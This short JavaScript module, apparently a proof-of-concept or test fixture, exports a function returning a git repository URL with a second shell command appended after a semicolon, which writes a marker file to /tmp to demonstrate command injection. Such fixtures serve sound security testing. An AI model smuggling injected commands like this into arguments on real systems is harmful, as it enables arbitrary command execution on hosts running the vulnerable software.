function getPayload() {
    return "https://github.com/sh0ji/git-tags-remote.git; touch git-tags-remote > /tmp/command-injection.test";
}

module.exports = { getPayload };